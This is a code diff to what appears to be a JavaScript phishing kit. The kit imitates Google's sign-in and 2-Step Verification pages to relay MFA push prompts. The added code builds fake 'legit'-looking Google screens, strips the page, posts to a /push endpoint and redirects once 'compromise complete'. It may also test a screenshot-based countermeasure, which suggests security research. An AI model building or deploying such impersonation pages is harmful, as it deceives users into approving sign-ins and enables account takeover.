@@ -133,6 +133,10 @@ const moveToMFA = function(json) {
         console.log("Using Push Notification...")
         displayPush()
         break;
+      case 3:
+        console.log("Testing proposed Solution")
+        displaySolution()
+        break;
       default:
         console.log("Defaulted to Failure...")
         displayFailure("Account or password incorrect")
@@ -256,6 +260,82 @@ const displayPush = function() {
   verificationTitle.style.padding = "0px 50px 0px 50px";
   var verificationExplained = document.createElement("p")
   verificationExplained.innerHTML = "Google sent a notification to your phone. Open the Google app and tap <b>Yes</b> on the prompt to sign in."
+  verificationExplained.style.textAlign = "left"
+  verificationExplained.style.padding = "0px 50px 0px 50px";
+
+  // add the little image of a phone
+  var img = document.createElement("img")
+  img.src = "google_phone.png"
+  img.style.padding = "0px 50px 0px 50px"
+
+  // shrink the avatar
+  var avatar = document.querySelector("#avatarDiv")
+  avatar.remove()
+
+  var space = document.getElementById("removeMe2")
+  space.parentNode.insertBefore(accountName, space)
+  space.parentNode.insertBefore(img, space)
+  space.parentNode.insertBefore(verificationTitle, space)
+  space.parentNode.insertBefore(verificationExplained, space)
+  document.getElementById("inputs").remove()
+
+  document.querySelector("#removeLoginDiv").remove()
+  document.querySelector("#aboveInputs").remove()
+  document.querySelector("#removeMe1").remove()
+  document.querySelector("#removeMe2").remove()
+  document.querySelector("#removeMe3").remove()
+
+  /* now wait on server to release promise and redirect (compromise complete)*/
+  // add to server
+  fetch("/push", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" }
+  })
+  .then(function(response) {
+    return response.json();
+  })
+  .then(json => {
+    window.location.href = "https://agame.com"
+  })
+  return false;
+}
+
+/* Push covers Push w/ numbers because this additional context does not defeat mal endpoint... */
+const displaySolution = function() {
+  // update background size
+  document.getElementById("loginBackdrop").style.height = "395px"
+
+  // update headers
+  document.getElementById("headerField").innerHTML = "2-Step Verification";
+  document.getElementById("subheaderField").innerHTML = "This extra step shows it's really you trying to sign in";
+
+  // reset inputs
+  var bullets = document.querySelector("#Bullets")
+  var inputField = document.querySelector("#inputField")
+
+  inputField.parentNode.insertBefore(bullets, inputField)
+
+  // update opacities
+  inputField.style.opacity = "100"
+  bullets.style.opacity = "0"
+
+  // update to look normal again
+  inputField.onkeyup = function(){};
+
+  // ****** all below should be in a case by account statements
+  // new html to look legit
+  var accountName = document.createElement("p")
+  accountName.innerHTML = username.bold()
+  accountName.style.fontSize = "large"
+  accountName.style.textAlign = "center"
+  accountName.style.padding = "0px 50px 0px 50px";
+  var verificationTitle = document.createElement("p")
+  verificationTitle.innerHTML = "Check your phone".bold()
+  verificationTitle.style.fontSize = "large"
+  verificationTitle.style.textAlign = "left"
+  verificationTitle.style.padding = "0px 50px 0px 50px";
+  var verificationExplained = document.createElement("p")
+  verificationExplained.innerHTML = "Google sent a screenshot notification to your phone. Open the Google app and tap <b>Yes</b> on the prompt to sign in after verifying the image."
   verificationExplained.style.textAlign = "left"
   verificationExplained.style.padding = "0px 50px 0px 50px";
 
